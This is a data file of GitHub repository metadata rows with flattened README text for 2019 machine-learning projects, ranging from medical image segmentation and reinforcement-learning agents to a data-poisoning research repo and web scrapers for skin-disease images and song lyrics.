saadhaxxan,AIPakistan,n/a,AIPakistan Build Status https img shields io badge Build Passing brightgreen svg style for the badge logo appveyor Open Source Love svg1 https badges frapsoft com os v1 open source svg v 103 GitHub Forks https img shields io github forks saadhaxxan AIPakistan svg style social label Fork maxAge 2592000 https www github com saadhaxxan AIPakistan fork GitHub Issues https img shields io github issues saadhaxxan AIPakistan svg style flat label Issues maxAge 2592000 https www github com saadhaxxan AIPakistan issues contributions welcome https img shields io badge contributions welcome brightgreen svg style flat label Contributions colorA red colorB black This Repo has the content for group of AIPakistan on facebook made to teach people Deep Learning and Machine Learning in an easy way Note Run the code using Google Colab https colab research google com or in jupyter notebook and if you want a separate python file is also available If you are running it locally definitely install the rquirements before running the files download the requirements using requirement txt file pip install r requirement txt Each folder has a separate model in both ipynb and py format with different dataset Each Readme associated with each folder has the link to the dataset you need Citation DOI https zenodo org badge 214355245 svg https zenodo org badge latestdoi 214355245 If you use this tool for your research then kindly cite it Click the above badge for more information regarding the complete citation for this tool and diffferent citation formats like IEEE APA etc Author You can get in touch with me on my LinkedIn Profile Saad Hassan LinkedIn Link https img shields io badge Connect saadhaxxan blue svg logo linkedin longCache true style social label Connect https www linkedin com in saadhaxxan You can also follow my GitHub Profile to stay updated about my latest projects GitHub Follow https img shields io badge Connect saadhaxxan blue svg logo Github longCache true style social label Follow https github com saadhaxxan If you liked the repo then kindly support it by giving it a star Contributions Welcome forthebadge https forthebadge com images badges built with love svg If you find any bug in the code or have any improvements in mind then feel free to generate a pull request Issues GitHub Issues https img shields io github issues saadhaxxan AIPakistan svg style flat label Issues maxAge 2592000 https www github com saadhaxxan AIPakistan issues If you face any issue you can create a new issue in the Issues Tab and I will be glad to help you out License MIT https img shields io cocoapods l AFNetworking svg style style label License maxAge 2592000 master LICENSE Copyright c 2019 SAAD HASSAN,2019-10-11T05:59:55Z,2019-10-14T15:40:01Z,Jupyter Notebook,saadhaxxan,User,1,1,0,34,master,saadhaxxan,1,1,1,0,0,0,0
arunvignesh15,100DaysOfML,deep-neural-networks#machine-learning-algorithms,100DaysOfML I am taking up this challenge to learn Machine Learning and Deep Learning every day for at least one hour for each topic respectively Check out for Machine Learning https github com mankertales 100DaysOfML blob master MachineLearning README md concepts Check out for Deep Learning https github com mankertales 100DaysOfML blob master DeepLearning README md concepts,2019-09-30T07:19:04Z,2019-11-18T17:35:29Z,Jupyter Notebook,arunvignesh15,User,1,1,0,84,master,arunvignesh15,1,0,0,0,0,0,0
ksluck,Coadaptation,n/a,Fast Evolution through Actor Critic Reinforcement Learning This is the official repository providing a refactored implementation of the data driven design optimization method presented in the paper Data efficient Co Adaptation of Morphology and Behaviour with Deep Reinforcement Learning https research fb com publications data efficient co adaptation of morphology and behaviour with deep reinforcement learning This paper was presented on the Conference on Robot Learning in 2019 The website for this project can be found here https sites google com view drl coadaptation home At the moment the repository contains a basic implementation of the proposed algorithm and its baseline We use particle swarm optimization on the Q function which is used as a surrogate function predicting the performance of design candidates and thus avoiding the necessity to simulate evaluate design candidates The baseline uses also particle swarm optimization but evaluates design candidates in simulation instead The current environment provided is Half Cheetah using pybullet for which we have to learn effective movement strategies and the optimal leg lengths maximizing the performance of the agent Additional methods and environments which are shown in the paper will be added over time and the structure of the repository might change in the future Citation If you use this code in your research please cite inproceedingsluck2019coadapt title Data efficient Co Adaptation of Morphology and Behaviour with Deep Reinforcement Learning author Luck Kevin Sebastian and Ben Amor Heni and Calandra Roberto booktitle Conference on Robot Learning year 2019 Acknowledgements of Previous Work This project would have been harder to implement without the great work of the developers behind rlkit and pybullet The reinforcement learning loop makes extensive use of rlkit a framework developed and maintained by Vitchyr Pong You find this repository here https github com vitchyr rlkit We made slight adaptations to the Soft Actor Critic algorithm used in this repository Tasks were simulated in PyBullet https pybullet org wordpress the repository can be found here https github com bulletphysics bullet3 tree master examples pybullet Adaptations were made to the files found in pybulletevo to enable the dynamic adaptation of design parameters during the training process Why do you use an older version of rlkit When I started working on this project the tag v0 1 2 was the newest There are quite many changes from 0 1 2 to 0 2 0 I will tackle this update in the future Installation Make sure that PyTorch is installed You find more information here https pytorch org First clone this repository to your local computer as usual Then install the required packages via pip by executing pip3 install r requirements txt The SAC implementation used differs slightly from the original version in rlkit developed by Vitchyr Pong For your convenience I provide a forked repository However all credit for the SAC implementation goes to Vitchyr Pong https github com vitchyr rlkit Clone the adapted rlkit with bash git clone https github com ksluck Coadaptation rlkit git Now set in your terminal the environment variable PYTHONPATH with bash export PYTHONPATH path to Coadaptation rlkit where the folder path to Coadaptation rlkit contains the folder rlkit This enables us to import rlkit with import rlkit You may have to set the environmental variable every time you open a new terminal Starting experiments After setting the environmental variable and installing the packages you can proceed to run the experiments There are two experimental configurations already set up for you in experimentconfigs py You can execute them with bash python3 main py sacpsobatch and bash python3 main py sacpsosim You may change the configs or add new ones Make sure to add new configurations to the configdict in experimentconfigs py Data logging If you execute these commands they will automatically create directories in which the performance and achieved rewards will be stored Each experiment creates a specific folder with the current date time and a random string as name You can find in this folder a copy of the config you executed and one csv file for each design on which the reinforcement learning algorithm was executed Each csv file contains three rows The type of the design either Initial Optimized or Random The design vector And the subsequent cumulative rewards for each episode trial The file ADDVIZFILE provieds a basic jupyter notebook to visualize the collected data,2019-10-27T00:12:32Z,2019-11-21T05:21:19Z,Python,ksluck,User,1,1,0,1,master,ksluck,1,0,0,0,0,0,0
upashu1,Pytorch-Unet-2.0,n/a,Pytorch Unet 2 0 for noisy image segmentation Improved UNet CNN Deep Learning Image Segmentation for noisy images More accurate More stable Trained for microarray images Note Download the repository from here https github com upashu1 Pytorch UNet 2 Example results for the pre trained models Input Image Output Segmentation Image 307 png 307outmaskunet2 png 313 png 313outmaskunet2 png UNet 2 0 is a modified version of UNet for better segmentation even image is noisy Below is the pictorial view difference between UNet and UNet 2 0 picutre of unet and unet2 Unet2 png This https github com upashu1 Pytorch UNet 2 is a forked version of https github com milesial Pytorch UNet To know more about it Click Here For Original Edition https github com milesial Pytorch UNet Usage Note Use Python 3 Download pretrained network CP67 zip https www amazon com clouddrive share 1VsNFgJ1E6k83MjcLbrU2Z77fX1Nhm7YEpUxIIHZGi6 for noisy microarray images from here http wix to 2cAQBBA Unzip it CP67 zip in same folder It should be now CP67 pth Use checkoutput py program to check output on your images For training on your images use train2 py For training program assumes input image size 512 x 512 which is broken by program into 128 x 128 for training There is no limitation of image size on testing predicting checking output,2019-10-04T05:36:38Z,2019-10-09T11:06:45Z,Python,upashu1,User,1,1,0,10,master,upashu1,1,0,0,0,0,0,0
locuslab,uniform-convergence-NeurIPS19,n/a,What does the code do The file experiments py contains all the code required to run our experiments Each run of this script trains a fully connected feedforward neural network on two random draws of a subset of the MNIST dataset from the same initialization The results of the experiment such as the numerical values of the NUMERATOR of the generalization bounds are saved inside a new folder The folder name is automatically assigned to be the lowest available integer in the parent folder Please see spec file txt and package list txt for the dependencies Note The file uniform convergence ipynb is a Jupyter Notebook that presents the code in a much more aesthetic format although for slightly different parameter settings The code in the notebook also prints the plots for you which this script unfortunately does not You can also find this notebook in our blog https locuslab github io 2019 07 09 uniform convergence The rest of the document describes experiments py How to run the code The script has six options relevant to the paper that can be used as follows python experiments py hdim 1024 depth 5 ntrain 4096 margin 10 nbatch 64 threshold 0 01 hdim sets the width of the network depth corresponds to the number of hidden layers in the network ntrain is the size of the training dataset margin and threshold determine the number of epochs until which the network is optimized to minimize the cross entropy loss Specifically the code will stop at the epoch when at least 1 threshold of the training data is classified by the given margin Where do I find the results The results of the experiments are stored as follows readme txt contains the hyperparameters of the experiment bounds txt Contains a list of 6 numerical values corresponding to the NUMERATOR of the following generalization bounds in the paper we plot this divided by the denominator The first value is the PAC Bayes based bound from Neyshabur et al 18 The second value is the same bound replaced with distance from initialization The third value is the same bound replaced with distance from weights learned on another subset The fourth value is the covering number based bound from Bartlett et al 17 The fifth value is the same bound but with distance from initialization not l2 The final value is the bound from Neyshabur 19 et al that applies only to single hidden layer networks distancebetweenweights txt Contains a list of values corresponding to the l2 norm between the weights learned on two different datasets from the same initialization Each value corresponds to the weight matrix at a particular depth with the first value corresponding to the weight matrix following the input layer distancefrominitialization txt Contains l2 norms of the update matrices spectralnorm txt Contains spectral norms of the learned weight matrices frobeniusnorm txt Contains the frobenius norms of the learned weight matrices testerrors txt Contains the two test errors from the two runs margins txt Contains the margin of the network on each training datapoint testmargins txt Contains the margin of the network on each test datapoint,2019-10-26T03:21:57Z,2019-11-24T14:15:24Z,Jupyter Notebook,locuslab,Organization,4,1,1,5,master,vaishnavh,1,0,0,0,0,0,0
ManishaJhunjhunwala,Banana-DQN-NavigationDRLND,n/a,Banana reinforcement learning DQN implementation Banana is a deep Q learning implementation of DQN paper Project 1 Navigation Introduction For this project you will train an agent to navigate and collect bananas in a large square world UnityEnvironmentBanana gif A reward of 1 is provided for collecting a yellow banana and a reward of 1 is provided for collecting a blue banana Thus the goal of your agent is to collect as many yellow bananas as possible while avoiding blue bananas The state space has 37 dimensions and contains the agent s velocity along with ray based perception of objects around agent s forward direction Given this information the agent has to learn how to best select actions Four discrete actions are available corresponding to 0 move forward 1 move backward 2 turn left 3 turn right The task is episodic and in order to solve the environment your agent must get an average score of 13 over 100 consecutive episodes Getting Started 1 Download the environment from one of the links below You need only select the environment that matches your operating system Linux click here https s3 us west 1 amazonaws com udacity drlnd P1 Banana BananaLinux zip Mac OSX click here https s3 us west 1 amazonaws com udacity drlnd P1 Banana Banana app zip Windows 32 bit click here https s3 us west 1 amazonaws com udacity drlnd P1 Banana BananaWindowsx86 zip Windows 64 bit click here https s3 us west 1 amazonaws com udacity drlnd P1 Banana BananaWindowsx8664 zip For Windows users Check out this link https support microsoft com en us help 827218 how to determine whether a computer is running a 32 bit version or 64 if you need help with determining if your computer is running a 32 bit version or 64 bit version of the Windows operating system For AWS If you d like to train the agent on AWS and have not enabled a virtual screen https github com Unity Technologies ml agents blob master docs Training on Amazon Web Service md then please use this link https s3 us west 1 amazonaws com udacity drlnd P1 Banana BananaLinuxNoVis zip to obtain the environment Dependencies To set up your python environment to run the code in this repository follow the instructions below 1 Create and activate a new environment with Python 3 6 Linux or Mac bash conda create name drlnd python 3 6 source activate drlnd Windows bash conda create name drlnd python 3 6 activate drlnd 2 Follow the instructions in this repository https github com openai gym to perform a minimal install of OpenAI gym Next install the classic control environment group by following the instructions here https github com openai gym classic control Then install the box2d environment group by following the instructions here https github com openai gym box2d 3 Clone the repository if you haven t already and navigate to the python folder Then install several dependencies bash git clone https github com udacity deep reinforcement learning git cd deep reinforcement learning python pip install 4 Create an IPython kernel http ipython readthedocs io en stable install kernelinstall html for the drlnd environment bash python m ipykernel install user name drlnd display name drlnd 5 Before running code in a notebook change the kernel to match the drlnd environment by using the drop down Kernel menu Implementation The project was solved using deep reinforcement learning more specifically a Deep Q Network The code was based upon the Luna example from the Udacity Deep Reinforcement Learning GitHub repo h ttps github com udacity deep reinforcement l earning tree master dqn This was modified and updated to work with the Unity ML environment and extended with new model architecture The Jupyter notebook Navigation ipynb contains the implementation for training the agent in the environment dqnagent py contains the Deep Q learning agent which interacts with the environment to optimize the reward model py contains the Neural Network which takes in the input state and outputs the desired Q values Results The results from the DQN were impressive It easily achieved an average score of 13 pretty easily in 491 episodes Episode 100 Average Score 0 99 Episode 200 Average Score 5 11 Episode 300 Average Score 8 40 Episode 400 Average Score 10 18 Episode 500 Average Score 11 54 Episode 587 Average Score 13 06 Environment solved in 587 episodes Average Score 13 06 outputgraph png Place the file in the directory of GitHub repository files Environment is considered solved if average of 100 episodes is more than 13 Running a script is not a problem Just execute it in sequential order,2019-10-08T10:20:59Z,2019-10-09T17:26:49Z,Jupyter Notebook,ManishaJhunjhunwala,User,1,1,0,6,master,ManishaJhunjhunwala,1,0,0,0,0,0,0
yoonchoi-neuro,automated_hybrid_IDH,n/a,automatedhybridIDH This is public repository for Fully Automated Hybrid Network to Predict IDH Mutation Status of Glioma via Deep Learning and Radiomics by Choi et al The hybrid model comprised three parts Model 1 CNN U Net for tumor segmentation Model 2 CNN ResNet classifier for IDH status Model 3 Radiomics classifier for IDH status Model 1 and 2 are written in Python PyTorch The Model 3 radiomicsclassifier rds and the logistic model hybridlogit rds to combine Model 2 and Model 3 are written in R One sample with 3 images T1C FLAIR T2 is availalbe in this repository examplet1c nii gz exampleflair nii gz and examplet2 nii gz The overall process of applying the pretrained model to this sample is demonstrated in Modeltesting ipynb,2019-10-09T03:15:05Z,2019-12-04T01:52:57Z,Python,yoonchoi-neuro,User,1,1,0,7,master,yoonchoi-neuro,1,0,0,0,0,0,0
neerajkumarvaid,Tumor-Segmentation,n/a,Tumor Segmentation This repository contains an implementation of a deep learning algorithm for tumor segmentation from Whole Slide Images of tissue sections Requirements Weights tumordetection26July2019 h5 Code tofcn py Libraries Keras Tensorflow Numpy Openslide PIL Scipy How to use TumordetectioninferenceOnly py is the main file that will read in the weights and supporting code to run the tumor segmentation model You can change the directory of your images at line 37 of this file You may also change the directory for saving the results at line 68,2019-10-03T20:21:52Z,2019-10-04T15:42:01Z,Python,neerajkumarvaid,User,1,1,1,5,master,neerajkumarvaid#ruchikaverma-iitg,2,0,0,0,0,0,0
yoke2,PR-PRMLS-IS1FT-GRP-A22G-FoodClassification,n/a,Pattern Recognition and Machine Learning Systems Group Project Readme SECTION 1 PROJECT TITLE Food Image Classification SECTION 2 EXECUTIVE SUMMARY Singapore is considered a food haven and a favourite national topic by many spawning popular food blogs and long queues across the island Given the huge focus on food and growing emphasis on healthy lifestyle there is great potential in applying Computer Vision Deep Learning techniques to food classification In this assignment the A22G team showcases the motivation behind the project and the effectiveness of Image Classification with Convolutional Neural Networks and its variants The team also strives to share with the reader the teams journey to develop highly effective Deep Learning vision models while overcoming challenges like overfitting and training deep models by applying best practices The team would also like to share empirical nuggets of wisdom gained from this journey when implementing various network architecture from scratch and techniques employed SECTION 3 TEAM MEMBERS Team Name A22G Members Alfred Tay Wenjie Wang Zilong Wong Yoke Keong SECTION 4 USAGE GUIDE Running notebooks on Google Colab The team has provided notebooks that are ready to run in Google Colab Please see below for instructions 1 Navigate to the Notebooks Notebooks folder 2 Within the folder there is a Notebook Description file listing the each notebook file a brief description for that notebook and a link to open the notebook in Google Colab 3 Click on the Open in Colab icon Open In Colab https colab research google com assets colab badge svg to view the Notebook in Google Colab Playground Mode 4 To execute the notebook you need to make a copy of it by clicking on the Copy to Drive icon and subsequently from the menu click Runtime Run all Please note that you will need to have a Google Account to execute the notebook Offline install The notebooks have been validated on Google Colab For local run please refer to the requirements below System Requirements 1 OS Ubuntu 18 04 3 LTS 2 Python 3 6 8 3 graphviz is required to be installed please use command sudo apt get qq install y graphviz Python package requirements To install them please use command pip install r requirements txt using the accompanying requirements txt Note on running on Windows To run on Windows python packages need to be installed The path names within the notebooks will need to be modified accordingly Project Report The project report can be downloaded from the Report folder,2019-09-28T08:08:10Z,2019-11-18T02:32:47Z,Jupyter Notebook,yoke2,User,1,1,0,11,master,yoke2,1,0,0,0,0,1,0
sparticlesteve,climate-seg-benchmark,n/a,Deep Learning Climate Segmentation Benchmark Reference implementation for the climate segmentation benchmark based on the Exascale Deep Learning for Climate Analytics codebase here https github com azrael417 ClimDeepLearn and the paper https arxiv org abs 1810 01993 How to get the data For now there is a smaller dataset 200GB total available to get things started It is hosted via Globus https app globus org file manager originid bf7316d8 e918 11e9 9bfc 0a19784404f4 originpath 2F and also available via https https portal nersc gov project dasrepo deepcam climseg data small How to run the benchmark Submission scripts are in runscripts Running at NERSC To submit to the Cori KNL system do bash This example runs on 64 nodes cd runscripts sbatch N 64 traincori sh To submit to the Cori GPU system do bash 8 ranks per node 1 per GPU module purge module load esslurm cd runscripts sbatch N 4 traincorigpu sh,2019-09-23T16:01:13Z,2019-12-04T18:58:04Z,Python,sparticlesteve,User,1,1,0,21,master,sparticlesteve,1,0,0,0,0,0,0
DAInal1,ImageCaptionGenerator,n/a,Image Caption Generator This is an image caption generating model that uses Keras deep learning modules to create an image description generator that takes a photo as an input and outputs a text description of the image This model was trained using How to Develop a Deep Learning Photo Caption Generator from Scratch https machinelearningmastery com develop a deep learning caption generation model in python as a reference Data was obtained from Data Request Form https forms illinois edu sec 1713398 This was an exercise to better understand how Deep Learning can be used with image and textual data for the data training part I m still reading the paper on Very Deep Convolutional Networks for Large Scale Image Recognition https arxiv org abs 1409 1556 to better understand the implementation details for the VGG16 used to train the network here so it can be optimized better Result Result picture https github com hamk3010 ImageCaptionGenerator blob master result 20Screenshot png Result Result picture source https www flickr com photos cliffkinch 25082647218 in photolist Edt89N 27zySxp 27HihJd XzLCrK Z5Z2hg 27KLYF1 G2Z3Gk 211rM9C GErdQ9 GKFH1t 22KabRS ZD1drF 27kKVcd EUwRCE 24AoCEN aigtcQ 27ZS1Rs 8qXSTP ZfWfeo 24AoCuC Kb1tDn XzLCpR YLD3v5 25tLfvC HpJ6Uo 275mtZM YRxVLU TjFi1T 25zE7KJ a1Xtpq bAkJeJ oc6ihM YdQoz6 YdQomv 25u7WZ3 26N2Pmf HzHUmd 8injVj JXcCH8 6p9pft Zz36X8 bCEstU qDnA7F oC7xdL gbEEr8 7GKKTK 26YswW2 86P58b 8gFkyP 292C7e9,2019-09-22T15:18:50Z,2019-11-22T18:05:19Z,n/a,DAInal1,Organization,0,1,1,13,master,hamk3010,1,0,0,0,0,0,0
wyne1,Energy-Consumption-Time-Series,n/a,Energy Consumption Time Series Individual household electric power consumption Data Set Primarily trying to device the method that could be used to forecast energy consumption of the upcoming month based on one months data only A lot of experimentations done over different models The experimentation is demonstrated and results are plotted as well The 5 methods that are worked upon are 1 ARIMA Forecasting for 1 timestep and for whole month 2 Facebook Prophet forecasting based on variable amount of training data 3 Using Auto Regression AR with walk forward validation 4 Using Moving Average MA with anamoly detection within data 5 Using Deep Learning for Time Series modeling The accuracy over here does not depend on the individual daily predictions that are calculated against yhat and true value The Goal here is to predict the overall energy consumption in the month Therefore the individual predictions may not seem as accurate as they should be but the commulative monthly energy consumptions sum of yhat when compared against the actual monthly consumption from the test set could potentially have better results The accuracy of overall energy consumption is deduced through the following simple metric Percent Error Experimental Value Theoretical Value Theoretical Value x 100 NOTE You will have to clean and preprocess the data that you download for missing values For help with that preprocessing refer to the reference 1 and 2 of Jason Brownlee s machinelearningmastery blog Refrences https machinelearningmastery com how to develop an autoregression forecast model for household electricity consumption https machinelearningmastery com multi step time series forecasting with machine learning models for household electricity consumption https pythondata com forecasting time series autoregression Dataset https archive ics uci edu ml datasets individual household electric power consumption,2019-10-22T13:44:06Z,2019-10-22T17:40:20Z,Jupyter Notebook,wyne1,User,1,1,0,10,master,wyne1,1,0,0,0,0,0,0
lmunoz-gonzalez,Poisoning-Attacks-with-Back-gradient-Optimization,n/a,Poisoning Attacks with Back gradient Optimization Matlab code with an example of the poisoning attack described in the paper Towards Poisoning of Deep Learning Algorithms with Back gradient Optimization https dl acm org citation cfm id 3140451 The code includes the attack against Adaline Logistic Regression and a small MultiLayer Perceptron for MNIST dataset using digits 1 and 7 Use To generate the random training validation splits first run the script createSplits m in the MNISTsplits folder Then the scripts to run the attacks against Adaline logistic regression and the MLP are testAttackAdalineMNIST m testAttackLRmnist m and testAttackMLPmnist m respectively Citation Please cite this paper if you use the code in this repository as part of a published research project inproceedingsmunoz2017towards title Towards Poisoning of Deep Learning Algorithms with Back gradient Optimization author Mu noz Gonz alez Luis and Biggio Battista and Demontis Ambra and Paudice Andrea and Wongrassamee Vasin and Lupu Emil C and Roli Fabio booktitle Proceedings of the 10th ACM Workshop on Artificial Intelligence and Security pages 27 38 year 2017 Related papers You may also be interested some of our related papers on data poisoning Poisoning Attacks with Generative Adversarial Nets https arxiv org pdf 1906 07773 pdf L Muoz Gonzlez B Pfitzner M Russo J Carnerero Cano E C Lupu ArXiv preprint arXiv 1906 07773 2019 code available soon Label Sanitization against Label Flipping Poisoning Attacks http www research ibm com labs ireland nemesis2018 pdf paper1 pdf A Paudice L Muoz Gonzlez E C Lupu Nemesis Workshop on Adversarial Machine Learning Joint European Conference on Machine Learning and Knowledge Discovery in Databases pp 5 15 2018 Detection of Adversarial Training Examples in Poisoning Attacks through Anomaly Detection https arxiv org pdf 1802 03041 pdf A Paudice L Muoz Gonzlez A Gyorgy E C Lupu ArXiv preprint arXiv 1802 03041 2018 About the authors This research work has been a collaboration between the Resilient Information Systems Security RISS group http rissgroup org at Imperial College London https www imperial ac uk and the Pattern Recognition and Applications PRA Lab https pralab diee unica it en at the University of Cagliari https www unica it unica en homepage page,2019-10-25T16:47:07Z,2019-12-09T02:40:49Z,MATLAB,lmunoz-gonzalez,User,1,1,0,7,master,lmunoz-gonzalez,1,0,0,0,0,0,1
Noodles-321,OralScreen,n/a,Oral Cell Screening Project Code of paper A Deep Learning based Pipeline for Efficient Oral Cancer Screening on Whole Slide Images http arxiv org abs 1910 10549 Each sub directory contains a separate README instruction File paths in the code might need to be changed before running OralCellDataPreparation Nucleus Detection ND and Focus Selection FS modules trained on our data This will prepare all nucleus patches for classification It can be tuned to better performance on a new dataset by the code in two directories below NucleusDetection to customise the ND module FocusSelection to customise the FS module Classification Classification module References 1 cellcountingv2 https github com WeidiXie cellcountingv2 cellcountingv2 2 EMBM https github com GUAN3737 EMBM Copyright from EMBM All Rights Reserved This copyright statement may not be removed from any file containing it or from modifications to these files This copyright notice must also be included in any file or product that is derived from the source files Redistribution and use of this code in source and binary forms with or without modification are permitted provided that the following conditions are met Redistribution s of source code must retain the above copyright notice this list of conditions and the following disclaimer Redistribution s in binary form must reproduce the above copyright notice this list of conditions and the following disclaimer in the documentation and or other materials provided with the distribution The code and our papers are to be cited in the bibliography as Jingwei Guan Wei Zhang Jason Gu and Hongliang Ren No reference blur assessment based on edge modeling J Vis Commun Image Represent 29 2015 1C7 DISCLAIMER This software is provided by the copyright holders and contributors as is and any express or implied warranties including but not limited to the implied warranties of merchantability and fitness for a particular purpose are disclaimed In no event shall Shandong University members authors or contributors be liable for any direct indirect incidental special exemplary or consequential damages including but not limited to procurement of substitute goods or services loss of use data or profits or business interruption however caused and on any theory of liability whether in contract strict liability or tort including negligence or otherwise arising in any way out of the use of this software even if advised of the possibility of such damage,2019-10-20T13:16:53Z,2019-10-28T00:41:04Z,Python,Noodles-321,User,1,1,1,5,master,Noodles-321,1,0,0,0,0,0,1
AmrMahmoud12,Scrap-High-Quality-Skin-Diseases-images-From-DermNet,n/a,Scrap High Quality Images From DermNet unlike other scripts which scrap low quality images from dermnet com this script is unique as it scrap high quality hd images from dermnet com and then filters images and preprocesses them into a csv file with pathes of scrapped images Dermnet is considered the largest site of skin diseases images Requirements system Ubuntu 18 06 Python version 3 6 Minimum memory 4 and it is desirable to have much more NOTES 1 change the path of the folder to your system folder 2 low memory causes system block be carefull 3 images size near 2 GB and they are nearly 20000 images of high quality if you will not use it for now just star and fork it to make it easy reached for you again,2019-10-09T10:38:54Z,2019-10-09T11:50:40Z,Jupyter Notebook,AmrMahmoud12,User,1,1,0,8,master,AmrMahmoud12,1,0,0,0,0,0,0
navid-rekabsaz,iDSL_module4_part3_DL4NLP,n/a,Workshop Sessions This repository contains hands on experiments for document classification with Pytorch using both classical machine learning models and neural networks Day 1 Setting Up Setting Up The code is written and tested on Python 3 7 x The practical session is on Jupyter Notebook So consider installing them The codes require PyTorch and a set of libraries explaind in the following Install Pytorch The most convenient way is to first install Anaconda and then install Pytorch Follow the instructions at and The code is tested on PyTorch version 1 2 x Install required libraries Install dependent libraries pip3 install r requirements txt Downloads Clone the git repository git clone git github com navid rekabsaz iDSLmodule4part3DL4NLP git cd iDSLmodule4part3DL4NLP Download the zip file of the data of the DEEP project from the following link and decompress it https drive google com open id 1kE0aH1NPIbn91R3j4CV2AhIz3qQAyKAP After uncompressing the file copy the contents of the data folder to the data folder of the source code Please download a pre trained word2vec model from here https drive google com open id 1EIZHpTz1bVDjkHmcesbdD8szqAn2 9ik Copy the bin file to the data folder Check the Setup Run Jupyter Notebook jupyter notebook Open the notebook day1 1 Setup ipynb Run all of its cells If no error is raised the mission is done You may shutdown the day1 1 Setup ipynb notebook to save local memory Tip To debug the code and trace the results we use ipdb Here the cheetsheet of its usage https appletree or kr quickreferencecards Python Python 20Debugger 20Cheatsheet pdf Getting Familiarized with PyTorch Good understanding of the essentials for programming deep learning with PyTorch is necessary for the next steps There are many great materials available for familiarizing with PyTorch Here an official tutorial https pytorch org tutorials beginner deeplearning60minblitz html Day 2 Document Classification Preparing Dictionary BoW Vectors The notebook day2 1 PrepareDictionaryVectors ipynb creates a dictionary of words generates Bag of Words vectors of excerpts and project the vectors to 100 dimensions Classification with Standard Machine Learning Methods Notebook day2 2 ClassificationStandardML Classification with Deep Learning Notebook day2 3 ClassificationDeepLearning,2019-09-30T13:18:47Z,2019-10-03T12:10:09Z,Jupyter Notebook,navid-rekabsaz,User,1,1,0,8,master,navid-rekabsaz,1,0,0,0,0,0,1
barthelemymp,Quantum_Encoding,n/a,QuantumEncoding This repo contains the work done at FU on the idea of finding a better encoding for classical data into a quatum state Directory structure report pdf contains a detailed explanation of the project and some results code contains python files with the different function used to implement this new encoding Results CNOT results of the encoding with CNOT as entangling gate CRX results of the encoding with CRX as entangling gate CRX1layer results of the encoding with CRX as entangling gate and a one layer classical NN as a preprocessing of the data,2019-09-28T14:11:47Z,2019-11-29T14:13:12Z,Jupyter Notebook,barthelemymp,User,1,1,0,4,master,barthelemymp,1,0,0,0,0,0,0
ashwin4glory,PFAM-amino-acid-domain-classification,cnn-keras#deep-learning#keras-tensorflow#pfam-annotation,PFAM amino acid domain classification 1 Problem Description 1 1 Description Source https www kaggle com googleai pfam seed random split Data PFAM seed random split Download randomsplit zip Which contains train dev and test data files Problem Statement The task is given the amino acid sequence of the protein domain predict which family it belongs to 1 2 Source Useful links https www biorxiv org content 10 1101 626507v3 full https arxiv org pdf 1606 01781 pdf https www appliedaicourse com lecture 11 applied machine learning online course 3439 code example imdb sentiment classification 8 module 8 neural networks computer vision and deep learning 1 3 Real world objectives and constraints No low latency requirement Interpretability is not important Only sequence data is input data 2 Deep Learning Problem Formulation 2 1 Data This directory contains data to train a model to predict the function of protein domains based on the PFam dataset Domains are functional sub parts of proteins much like images in ImageNet are pre segmented to contain exactly one object class this data is presegmented to contain exactly and only one domain The purpose of the dataset is to repose the PFam seed dataset as a multiclass classification machine learning task 2 1 1 Data split and layout The approach used to partition the data into training dev testing folds is a random split Training data should be used to train your models Dev development data should be used in a close validation loop maybe for hyperparameter tuning or model validation Test data should be reserved for much less frequent evaluations this helps avoid overfitting on your test data as it should only be used infrequently 2 1 2 File Content Each fold train dev test has a number of files in it Each of those files contains csv on each line which has the following fields sequence HWLQMRDSMNTYNNMVNRCFATCIRSFQEKKVNAEEMDCTKRCVTKFVGYSQRVALRFAE familyaccession PF02953 15 sequencename C5K6N5PERM5 28 87 alignedsequence HWLQMRDSMNTYNNMVNRCFATCI RS F QEKKVNAEE MDCT KRCVTKFVGYSQRVALRFAE familyid zf Tim10DDP Description of fields Sequence These are usually the input features to your model Amino acid sequence for this domain There are 20 very common amino acids frequency 1 000 000 and 4 amino acids that are quite uncommon X U B O Z familyaccession These are usually the labels for your model Accession number in form PFxxxxx y Pfam where xxxxx is the family accession and y is the version number Some values of y are greater than ten and so y has two digits familyid One word name for family sequencename Sequence name in the form startindex endindex alignedsequence Contains a single sequence from the multiple sequence alignment with the rest of the members of the family in seed with gaps retained Generally the familyaccession field is the label and the sequence or aligned sequence is the training feature This sequence corresponds to a domain not a full protein 2 2 Mapping the real world problem to Deep Learning problem Since there are 18 000 output classes so this is a multiclass classification problem Performance Metric We ll be using accuracy as our performance metric 2 3 Deep learning constraints and objectives Objective The objective is to predict the family of the given domain of a amino acid using the sequence data posing a multi class classification problem Constraints No low latency requirement Get a decent accuracy Use only sequence data as input,2019-10-04T18:53:14Z,2019-10-09T03:21:10Z,Jupyter Notebook,ashwin4glory,User,1,1,0,3,master,ashwin4glory,1,0,0,0,0,0,0
BrendanBena,data-scraping,n/a,Data Scraping Tools A github repo that include tools used to gather data for deep learning based projects This repo assumes you have gone through the beginning projects of the DL DU repo and have some basic command line and python knowledge NLP Lyrics based Tool Our first tool will assist in NLP based deep learning projects With this we can make use of a python library created by GitHub user johnwmiller that allows us to scrape song lyric data from the popular lyrics website Genius Genius com Step 1 First on top of the libraries we have already installed for prior work in Simmon s DL repo we install the lyricsgenius library via the package manager pip To do so issue the command via terminal pip3 install lyricsgenius This will install not only the lyricsgenius library but also some other useful libraries for data scraping such as beautifulsoup and requests Step 2 Next to make use of this library and Genius s API we must obtain an access token from their website This portion requires us to sign up for an account if you don t happen to have one already Do this by visiting the Genius Account Sign Up Page https genius com signup Lyrics Genius Sign Up images geniussignup png After making an account visit the API Client Management Page https genius com api clients to sign up for an access token On this page you must add a name for your application as well as a website URL to link to Name it whatever you would like and I personally just put my github as the link for the website If you intend on using this for a proper application then you may want to add the associated website icon etc Lyrics Genius API images lyricsapi png Now that you have created an API client you ll be able to generate an access token to make us of this website The link for this page is here https genius com api clients in case you need to regenerate an access token Step 3 Finally it s time to make use of the Genius API token I ve written a program that adds some functionality on top of the lyricsgenius library that will allow us to create text files that are relativity clean and suited for NLP task If you haven t done so already clone or download the repo and for convenience I would suggest just working inside this directory Run the following program with the h argument so you can see what options are available python3 lyricscraper py h Once you have see the options available rerun the program adding your preffered artist number of songs and personal Genius API token There are defaults set if you wish to just see how it works otherwise enter something like this python3 lyricscraper py a Bob Dylan n 50 t YOUR GENIUS TOKEN Let it run for a bit the time it takes will depend on how many songs you choose to fetch then out should pop a text file for NLP work,2019-10-04T17:24:54Z,2019-11-02T23:14:16Z,Python,BrendanBena,User,2,1,0,12,master,BrendanBena,1,0,0,0,0,0,0
